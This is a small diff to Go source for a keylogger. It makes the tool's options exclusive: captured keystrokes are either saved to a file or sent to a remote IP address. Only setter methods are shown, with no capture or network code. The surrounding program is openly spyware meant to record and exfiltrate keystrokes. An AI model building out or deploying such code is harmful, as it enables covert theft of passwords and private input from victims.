@@ -21,11 +21,13 @@ func (k keylogger) getKey() string {
 // set keylogger to record results in given file
 func (k *keylogger) setSaveToFile(filename string) {
 	k.saveToFile = true
+	k.send = false
 	k.filename = filename
 }
 
 // set keylogger to send results to given ip destination
 func (k *keylogger) setSend(ipdst string) {
 	k.send = true
+	k.saveToFile = false
 	k.ipdst = ipdst
 }
